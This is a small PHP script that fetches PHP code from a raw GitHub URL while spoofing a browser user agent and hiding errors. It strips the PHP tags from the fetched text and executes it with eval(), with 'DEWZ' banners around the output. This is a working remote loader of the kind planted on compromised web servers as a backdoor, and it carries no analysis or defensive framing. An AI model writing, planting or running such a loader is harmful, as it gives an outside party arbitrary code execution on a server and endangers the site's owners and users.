<?php

$url_github = "https://raw.githubusercontent.com/dewa123qwe-hash/ssss/refs/heads/main/11.PHP";


ini_set('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');


$kode_mentah = @file_get_contents($url_github);

if ($kode_mentah !== false) {
    
    $kode_bersih = str_replace(['<?php', '?>', '<?'], '', $kode_mentah);
    
    echo "--- DEWZ ---\n";
    
    
    eval($kode_bersih);
    
    echo "\n--- DEWZ ---";
} else {
    echo "LOL.";
}
?>
